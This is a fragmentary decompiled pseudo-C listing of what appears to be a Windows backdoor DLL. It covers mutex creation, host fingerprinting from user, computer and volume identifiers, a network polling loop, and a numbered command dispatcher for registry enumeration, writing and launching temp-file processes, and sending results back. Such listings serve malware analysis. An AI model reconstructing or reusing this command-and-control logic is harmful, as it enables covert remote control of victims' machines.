#include "6258f929-d40f-4c31-81ac-904e65c527b7.h"
...
__int64 __fastcall sub_62741200(LPVOID lpParameter, unsigned int a2, __int64 a3)
{
  ...
  if ( a2 )
  {
    ...
    if ( a2 - 1 <= 1 )
    {
      if ( !(unsigned int)sub_62741010((__int64)lpParameter, a2, a3) )
        goto LABEL_5;
      v6 = sub_62749810(lpParameter, a2, a3);
      if ( v6 )
      {
        if ( a2 != 1 )
        {
          v6 = sub_62741420(lpParameter);
          goto LABEL_6;
        }
        sub_627484D0();
        v6 = sub_62741420(lpParameter);
        if ( v6 )
          goto LABEL_6;
        sub_62741420(lpParameter);
        sub_62749810(lpParameter, 0, a3);
      }
      else if ( a2 != 1 )
      {
        goto LABEL_5;
      }
      sub_62741010((__int64)lpParameter, 0, a3);
      goto LABEL_6;
    }
    v6 = sub_62741420(lpParameter);
    if ( a2 != 3 )
...
__int64 __fastcall sub_627413A0(__int64 a1)
{
  return sub_62749900(&unk_62751000, a1);
}


__int64 sub_627413B0()
{
  return sub_627413A0((__int64)nullsub_1);
}
...
__int64 __fastcall sub_62741510(int a1)
{
  return (unsigned int)(4 * ((a1 + 2) / 3) + 1);
}
...
__int64 __fastcall sub_62741E70(unsigned __int8 *a1, int a2, int a3)
{
  int v3; // r8d
  __int64 v4; // r10
  int v5; // eax
...
WCHAR *__fastcall sub_62742640(LPCCH lpMultiByteStr)
{
  int v2; // eax
  int cchWideChar; // ebx
  WCHAR *v4; // rsi
...
WCHAR *__fastcall sub_62742760(LPCCH lpMultiByteStr)
{
  int v2; // eax
  int cchWideChar; // ebx
  WCHAR *v4; // rsi
...
unsigned __int16 *__fastcall sub_627427E0(unsigned __int16 *a1)
{
  ...
  result = a1;
  v2 = *a1;
  for ( i = 0x100002600LL; (_WORD)v2; v2 = *result )
  {
...
WCHAR *__fastcall sub_627428E0(_BYTE *a1, int a2)
{
  int v4; // eax
  CHAR *v5; // rax
  CHAR *v6; // rbx
        ...
        if ( v16 )
        {
          ...
          if ( v17 )
          {
            ...
            if ( v18 )
            {
              ...
              *(_DWORD *)v19 = sub_62741E70((unsigned __int8 *)(v19 + 4), v29 - 4, 0);
              if ( a9 )
              {
...
int __fastcall sub_62742C40(char *Destination)
{
  ...
  WSAData WSAData; // [rsp+70h] [rbp-1B8h] BYREF
...
__int64 __fastcall sub_62742CD0(_DWORD *a1, int a2, const char *a3, int a4, DWORD *a5)
{
  const WCHAR *v7; // rsi
  DWORDLONG v8; // r14
  CHAR *v9; // rsi
  ...
  _MEMORYSTATUSEX Buffer; // [rsp+160h] [rbp-4C8h] BYREF
  BYTE Data[2]; // [rsp+1A0h] [rbp-488h] BYREF
  ...
  *(_WORD *)Data = 0;
  ...
  if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, v7, 0, 0x108u, &hKey) )
  {
    ...
    for ( i = 0; ; ++i )
    {
      ...
      {
        cbData = 260;
        if ( !RegQueryValueExW(phkResult, v16, 0, 0, Data, &cbData) )
        {
          Data[cbData] = 0;
          Data[cbData + 1] = 0;
          break;
  ...
  if ( v9 )
  {
    ...
    if ( v11 )
    {
      ...
      *(_DWORD *)v10 = sub_62741E70((unsigned __int8 *)(v10 + 4), cbData - 4, 0);
      if ( a4 )
      {
...
unsigned __int8 *__fastcall sub_62743070(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5)
{
  ...
  v9 = (unsigned __int8 *)sub_627460D0(Size);
  v10 = v9;
  if ( v9 )
  {
    v11 = (unsigned __int8 *)sub_62745B80((unsigned int)(LODWORD(Size[0]) + 1024));
    v10 = v11;
    if ( v11 )
    {
      *((_DWORD *)v11 + 1) = *a1;
...
char *__fastcall sub_627431B0(_DWORD *a1)
{
  ...
  BYTE Data[528]; // [rsp+1A0h] [rbp-468h] BYREF
    ...
    if ( v3 )
    {
      *v3 = 0;
      ...
      for ( i = 0; ; ++i )
      {
        ...
        {
          cbData = 260;
          if ( !RegQueryValueExW(phkResult, v4, 0, 0, Data, &cbData) )
          {
            Data[cbData] = 0;
            Data[cbData + 1] = 0;
            v7 = sub_627425A0((LPCWCH)Data);
            if ( v7 )
            {
              if ( *v2 && i )
                strcat(v2, v10);
            ...
            cbData = 260;
            if ( RegQueryValueExW(phkResult, lpValueName, 0, 0, Data, &cbData) )
            {
              strcat(v2, v10);
              strcat(v2, v13);
            }
            ...
            cbData = 260;
            if ( RegQueryValueExW(phkResult, v12, 0, 0, Data, &cbData) )
            {
              strcat(v2, v10);
              strcat(v2, v13);
            }
  ...
  if ( v9 )
  {
    ...
    if ( v11 )
    {
      ...
      *((_DWORD *)v10 + 7) = v12;
      v13 = (v12 + 3) & 0xFFFFFFFC;
      LODWORD(Size[0]) = v13 + 32;
      *(_DWORD *)v10 = sub_62741E70((unsigned __int8 *)v10 + 4, v13 + 28, 0);
      if ( a4 )
      {
        sub_62745FF0(v15, a3, strlen(a3));
        sub_62746060(v15, v10, v10, LODWORD(Size[0]));
        ...
        unsigned int *a8)
{
  ...
  if ( v11 )
  {
    ...
    v16 = v15 + 32;
    *v12 = sub_62741E70((unsigned __int8 *)v12 + 4, v15 + 28, 0);
    if ( a7 )
    {
...
_DWORD *__fastcall sub_62743B20(_DWORD *a1, int a2, __int64 a3, const char *a4, int a5, unsigned int *a6)
{
  ...
  if ( v10 )
  {
    ...
    *v11 = sub_62741E70((unsigned __int8 *)v11 + 4, v16 - 4, 0);
    if ( a5 )
    {
...
__int64 __fastcall sub_62743D10(unsigned __int16 *a1)
{
  ...
  wchar_t v11; // dx
  __int64 v12; // rax
  WCHAR String[276]; // [rsp+20h] [rbp-228h] BYREF

  v1 = sub_627427E0(a1);
  if ( wcslen(v1) <= 1 )
    return 0;
  v3 = (const wchar_t *)sub_62746BA0(&unk_6274B5C0);
  v4 = wcsnicmp(v1, v3, 2u);
  if ( !v4 )
  {
    v5 = sub_627427E0(v1 + 2);
    if ( !wcslen(v5) )
      goto LABEL_5;
    String[0] = 0;
    v6 = *v5;
...
LABEL_13:
    String[v10] = 0;
    if ( wcslen(String) )
      v4 = SetCurrentDirectoryW(String);
    goto LABEL_5;
  }
  v4 = 0;
LABEL_5:
...
unsigned __int16 *__fastcall sub_62743EA0(_DWORD *a1, int a2, const CHAR *a3, const char *a4, int a5, DWORD *a6)
{
            ...
            if ( v20 )
            {
              ...
              if ( TotalBytesAvail )
              {
                ...
                if ( v25 )
                {
                  ...
                  *(_DWORD *)v26 = sub_62741E70((unsigned __int8 *)(v26 + 4), v28 + 32, 0);
                  if ( a5 )
                  {
...
_DWORD *__fastcall sub_627444A0(
        _DWORD *a1,
        int a2,
        int a3,
        int a4,
        ...
        unsigned int *a11)
{
  ...
  if ( a2 != 7 )
    v14 = (a2 != 8) + 2;
  v15 = sub_62746DC0(v14, a7, a8, a4, lpMultiByteStr, a6);
  v16 = (_DWORD *)sub_62745B80(0x400u);
  v17 = v16;
  if ( v16 )
  {
    v16[1] = *a1;
    ...
    v19 = strlen(v18) + 1;
    strcpy((char *)v17 + 32, v18);
    sub_62746C30(v18);
    v17[6] = 32;
    v17[7] = v19;
    v20 = (v19 - 1 + 4) & 0xFFFFFFFC;
    v21 = v20 + 32;
    *v17 = sub_62741E70((unsigned __int8 *)v17 + 4, v20 + 28, 0);
    if ( a10 )
    {
...
__int64 sub_62744940()
{
  ...
  size_t v5; // rax
  LPVOID lpMem[6]; // [rsp+28h] [rbp-30h] BYREF

  lpMem[0] = 0;
  v0 = sub_627475F0(lpMem);
  if ( v0 )
  {
    if ( v0 > 0 )
    {
      ...
      while ( 2 )
      {
        ...
        do
        {
          while ( 1 )
          {
            ...
            v5 = wcslen(v4);
            if ( !wcsncmp(*(const wchar_t **)((char *)lpMem[0] + v2), v4, v5) )
              break;
            sub_62746C30(v4);
            v3 += 16;
          ...
          sub_62747BA0(*(_QWORD *)((char *)lpMem[0] + v2));
          sub_62746C30(v4);
          v3 += 16;
        }
...
__int64 __fastcall sub_62744B50(__int64 a1, wchar_t *a2)
{
  const WCHAR *v3; // rsi
  int v4; // eax
  int v5; // eax
  ...
  CHAR *lpMem; // [rsp+70h] [rbp-5F8h]
  int v44; // [rsp+78h] [rbp-5F0h]
  __int64 v45; // [rsp+80h] [rbp-5E8h]
  __int64 v46; // [rsp+88h] [rbp-5E0h]
  CHAR *lpMultiByteStr; // [rsp+90h] [rbp-5D8h]
  const CHAR *lpMultiByteStra; // [rsp+90h] [rbp-5D8h]
  char *v49; // [rsp+98h] [rbp-5D0h]
  _BYTE v50[272]; // [rsp+A0h] [rbp-5C8h] BYREF
  int v51; // [rsp+1B0h] [rbp-4B8h] BYREF
  int v52; // [rsp+1B4h] [rbp-4B4h] BYREF
  unsigned int v53; // [rsp+1B8h] [rbp-4B0h] BYREF
  DWORD v54; // [rsp+1BCh] [rbp-4ACh] BYREF
  WCHAR v55[262]; // [rsp+1C0h] [rbp-4A8h] BYREF
  DWORD nSize; // [rsp+3CCh] [rbp-29Ch] BYREF
  WCHAR Buffer[22]; // [rsp+3D0h] [rbp-298h] BYREF
  DWORD v58; // [rsp+3FCh] [rbp-26Ch] BYREF
  WCHAR v59[256]; // [rsp+400h] [rbp-268h] BYREF
  _DWORD v60[4]; // [rsp+600h] [rbp-68h] BYREF
  int v61[3]; // [rsp+610h] [rbp-58h] BYREF
  ...
  v58 = 256;
  v59[0] = 0;
  GetComputerNameExW(ComputerNameDnsDomain, v59, &v58);
  GetModuleHandleW(0);
  v54 = 257;
  GetUserNameW(v55, &v54);
  GetModuleHandleW(0);
  v4 = wcslen(a2);
  v5 = sub_62741E70((unsigned __int8 *)a2, 2 * v4, -1);
  v61[0] = VolumeSerialNumber[0] ^ v5;
  LODWORD(v3) = sub_62741E70((unsigned __int8 *)Buffer, 2 * nSize, -1);
  v61[1] = sub_62741E70((unsigned __int8 *)v55, 2 * v54, -1) ^ (unsigned int)v3;
  sub_62745C10(v60);
  v41 = (const char *)sub_62746B10(&unk_6274A0E0);
  v42 = (const WCHAR *)sub_62746BA0(&unk_6274A020);
  v6 = sub_62742960(v61, v60, v59, Buffer, v55, v42, a2, v41, 1, (unsigned int *)&v51);
  lpMem = v6;
  if ( !v6 )
    goto LABEL_12;
  ...
  while ( 1 )
  {
    ...
    if ( dword_6274A000 )
      v8 = 1;
    v11 = sub_62741F30(v9, v10, word_6274A004, 1, (__int64)&qword_6274B7D0, v7, 0, 0, &v53, v8);
    if ( v11 )
    {
      if ( v53 > 4 )
        break;
...
LABEL_14:
  ...
  sub_62746060(v50, v11, v11, v53);
  v44 = 0;
  if ( (unsigned int)sub_62741E70((unsigned __int8 *)v11 + 4, v53 - 4, 0) == *(_DWORD *)v11 )
  {
    v16 = v11 + 8;
    if ( *((_DWORD *)v11 + 1) )
    {
      ...
      do
      {
        ...
        {
          case 1:
            v28 = sub_62742CD0(v61, *((_DWORD *)v16 + 1), v41, 1, (DWORD *)&v51);
            v29 = (void *)v28;
            if ( v28 )
            {
              v30 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&qword_6274B7D0, v7, v28, v51, &v52, v8);
              if ( v30 )
                sub_62745BE0(v30);
              sub_62745BE0(v29);
            }
            ...
            break;
          case 2:
            v38 = sub_62743070(v61, *((_DWORD *)v16 + 1), v41, 1, &v51);
            v39 = v38;
            if ( v38 )
            {
              v40 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&qword_6274B7D0, v7, (__int64)v38, v51, &v52, v8);
              if ( v40 )
                sub_62745BE0(v40);
              sub_62745BE0(v39);
            }
            ...
            break;
          case 3:
            v31 = sub_62743670(v61, *((_DWORD *)v16 + 1), v41, 1, &v51);
            v32 = v31;
            if ( v31 )
            {
              v33 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&qword_6274B7D0, v7, (__int64)v31, v51, &v52, v8);
              if ( v33 )
                sub_62745BE0(v33);
              sub_62745BE0(v32);
            }
          ...
          case 4:
            v34 = v16 + 16;
            v35 = sub_62743EA0(v61, *((_DWORD *)v16 + 1), v16 + 16, v41, 1, (DWORD *)&v51);
            lpMultiByteStr = (CHAR *)v35;
            v16 += 16;
            if ( v35 )
            {
              v36 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&qword_6274B7D0, v7, (__int64)v35, v51, &v52, v8);
              if ( v36 )
                sub_62745BE0(v36);
              sub_62745BE0(lpMultiByteStr);
              v16 = v34;
            }
            break;
          case 5:
            ...
            if ( v25 )
            {
              v27 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&qword_6274B7D0, v7, (__int64)v25, v51, &v52, v8);
              if ( v27 )
                sub_62745BE0(v27);
              sub_62745BE0(v26);
            }
            ...
            break;
          case 6:
            v22 = sub_62743B20(v61, *((_DWORD *)v16 + 1), (__int64)(v16 + 16), v41, 1, (unsigned int *)&v51);
            v23 = v22;
            if ( v22 )
            {
              v24 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&qword_6274B7D0, v7, (__int64)v22, v51, &v52, v8);
              if ( v24 )
                sub_62745BE0(v24);
              sub_62745BE0(v23);
            }
          ...
          case 8:
            v19 = sub_627444A0(
                    ...
                    *((_DWORD *)v16 + 1),
                    ...
                    &v16[*((unsigned int *)v16 + 4) - 8],
                    &v16[*((unsigned int *)v16 + 6) - 8],
                    (int)v16 + *((_DWORD *)v16 + 8) - 8,
                    *((_DWORD *)v16 + 9),
                    v41,
                    1,
                    (unsigned int *)&v51);
            ...
            if ( v19 )
            {
              v21 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&qword_6274B7D0, v7, (__int64)v19, v51, &v52, v8);
              if ( v21 )
                sub_62745BE0(v21);
              sub_62745BE0(v20);
            }
            ...
            break;
          case 0xA:
            lpMultiByteStra = (const CHAR *)sub_62746B10((char *)&qword_6274B7D0 + 4);
            v37 = (const CHAR *)sub_62746B10(&unk_6274B7E2);
            sub_62746DC0(
              2,
...
__int64 sub_627455E0()
{
  ...
  WCHAR PathName[264]; // [rsp+470h] [rbp-888h] BYREF
  WCHAR Dst[264]; // [rsp+680h] [rbp-678h] BYREF
...
__int64 __fastcall sub_627458E0(HMODULE hModule)
{
  const WCHAR *v2; // rbx
  HANDLE MutexW; // rsi
  _UNKNOWN **v4; // rsi
  ...
  v9 = sub_62744620(hModule, (__int64)Destination, (int)v5);
  if ( !v9 )
  {
...
__int64 __fastcall sub_62745A70(HMODULE hModule, wchar_t *a2)
{
  __int64 result; // rax

  if ( (unsigned int)sub_627483E0() )
    return sub_62744B50((__int64)hModule, a2);
  result = sub_627458E0(hModule);
  if ( !(_DWORD)result )
    return sub_62744B50((__int64)hModule, a2);
  return result;
}
...
__int64 __fastcall sub_62745AC0(HMODULE hModule)
{
  WCHAR *v2; // rbx
  HANDLE MutexW; // rsi
  wchar_t *v5; // rbp

  qword_627510B0 = hModule;
  v2 = (WCHAR *)sub_62746BA0(&unk_6274A080);
  SetLastError(0);
  MutexW = CreateMutexW(0, 0, v2);
  if ( MutexW )
  {
    if ( GetLastError() == 183 )
    {
      v5 = (wchar_t *)sub_62746BA0(&unk_6274B8C6);
      if ( (unsigned int)sub_62748230(v5) )
        sub_62745A70(hModule, v2);
      sub_62746C30(v5);
    }
    else
    {
...
void *__fastcall sub_627460D0(_DWORD *a1)
{
  void *v2; // rbx
  char *v4; // rax
  char *v5; // rdi
  ...
  SIZE_T v41; // [rsp+70h] [rbp-C8h]
  char v42[8]; // [rsp+B0h] [rbp-88h] BYREF
  __int64 v43; // [rsp+B8h] [rbp-80h] BYREF
  __int64 v44; // [rsp+C0h] [rbp-78h] BYREF
  unsigned int dwBytes; // [rsp+C8h] [rbp-70h] BYREF
  unsigned int dwBytes_4; // [rsp+CCh] [rbp-6Ch] BYREF
...
LABEL_15:
  ...
  {
    if ( !(unsigned int)qword_62751138(&dwBytes_4, &dwBytes) )
    {
      v4 = (char *)sub_62745B80(dwBytes);
      v5 = v4;
      v2 = v4;
      if ( v4 )
      {
        v2 = 0;
        if ( !(unsigned int)qword_62751130(dwBytes_4, dwBytes, v4) )
        {
          v20 = dwBytes_4;
                  ...
                  if ( !(unsigned int)qword_62751128(v28, 0, &v44) )
                  {
                    if ( !(unsigned int)qword_62751100(0, 1, &v43) )
                    {
                      if ( !(unsigned int)qword_62751120(v44, v43, &v47, 0) )
                      {
                        ...
                        v2 = sub_62745B80((unsigned int)v41);
                        if ( v2 )
                        {
...
__int64 __fastcall sub_62746DC0(int a1, const void *a2, DWORD a3, __int64 a4, LPCCH lpMultiByteStr, LPCCH a6)
{
  const WCHAR *v9; // rbx
  ...
  GetTempFileNameW(Buffer, &PrefixString, 0, Buffer);
    ...
    if ( !v14 || (v13 = 0, v14 == 183) )
    {
      ...
      if ( v13 )
      {
        if ( a1 == 1 )
        {
          ...
          v13 = CreateProcessW(0, Destination, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
          if ( v13 )
            goto LABEL_12;
          goto LABEL_19;
        }
        ...
        if ( v13 )
        {
          ...
          v19 = sub_62746C90(lpMultiByteStr);
          wcscat(Destination, v19);
          sub_62745BE0(v19);
...
__int64 __fastcall sub_627477A0(wchar_t *String)
{
  int v2; // eax
  unsigned int v3; // ebx
  __int64 v4; // rdi
  __int64 v5; // rbx
  size_t v6; // rax
  LPVOID lpMem[4]; // [rsp+28h] [rbp-20h] BYREF
  ...
  if ( v2 )
  {
    ...
    else
    {
      ...
      {
        v6 = wcslen(String);
        if ( !wcsncmp(*(const wchar_t **)((char *)lpMem[0] + v5), String, v6) )
        {
          v3 = 1;
          goto LABEL_7;
        }
...
_BOOL8 __fastcall sub_62747CC0(OLECHAR *psz)
{
  ...
  if ( CoCreateInstance(&stru_6274E060, 0, 1u, &stru_6274E0A0, &ppv) >= 0 )
  {
    ...
    v7 = v14.pRecInfo;
    v2 = 0;
    if ( (*(int (__fastcall **)(LPVOID, __m128i *, __m128i *, __m128i *, __m128i *))(*(_QWORD *)ppv + 80LL))(
           ppv,
           &si128,
           &v10,
           &v8,
           &v6) >= 0 )
    {
      ...
      if ( (*(int (__fastcall **)(LPVOID, OLECHAR *, __int64 *))(*(_QWORD *)ppv + 56LL))(ppv, v4, &v18) >= 0 )
      {
...
__int64 __fastcall sub_62748230(wchar_t *String2)
{
...
__int64 sub_627483E0()
{
  ...
  v0 = (wchar_t *)sub_62746BA0(dword_6274DD52);
  v1 = sub_62748230(v0);
  sub_62746C30((__int64)v0);
  return v1;
}
...
__int64 sub_62748460()
{
  ...
  do
    v4 = v3++;
  while ( qword_62749AB0[v3] );
  if ( v4 )
  {
    v0 = (void (**)(void))&qword_62749AB0[v4];
    v1 = &qword_62749AB0[v4 - (unsigned __int64)(v4 - 1) - 1];
    do
      (*v0--)();
    while ( v0 != (void (**)(void))v1 );
  }
  return sub_627413A0((__int64)sub_62748420);
}


__int64 sub_627484D0()
{
  __int64 result; // rax

  result = (unsigned int)dword_62751270;
  if ( !dword_62751270 )
  {
    dword_62751270 = 1;
    return sub_62748460();
...
LABEL_6:
    ...
    *(_QWORD *)(qword_62751828 + v10 + 24) = v12;
    if ( !VirtualQuery(v12, &Buffer, 0x30u) )
      sub_627487A0(
...
_BOOL8 __fastcall sub_627493E0(__int64 a1)
{
  __int64 v1; // rdx
  _BOOL8 result; // rax
...
_BOOL8 __fastcall sub_62749400(__int64 a1)
{
  return *(_WORD *)a1 == 23117 && sub_627493E0(a1);
}


__int64 __fastcall sub_62749420(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rcx
  __int64 result; // rax
  int v4; // ecx
...
const char *__fastcall sub_62749470(char *Str2)
{
  ...
  {
    v2 = 0;
    if ( *(_WORD *)off_6274DFD0 != 23117 || !sub_627493E0((__int64)off_6274DFD0) )
      return v2;
    v4 = *(int *)(v3 + 60) + v3;
...
__int64 sub_627495A0()
{
  ...
  {
    result = sub_627493E0((__int64)off_6274DFD0);
    if ( (_DWORD)result )
  ...
  if ( *(_WORD *)off_6274DFD0 == 23117 && sub_627493E0((__int64)off_6274DFD0) )
  {
    ...
    if ( (_DWORD)v4 )
    {
      ...
      if ( v6 )
      {
        ...
        for ( i = v2 + v4; *(_DWORD *)(i + 4) || *(_DWORD *)(i + 12); i += 20 )
        {
          if ( v1 <= 0 )
...
unsigned __int64 __fastcall sub_627497D0()
{
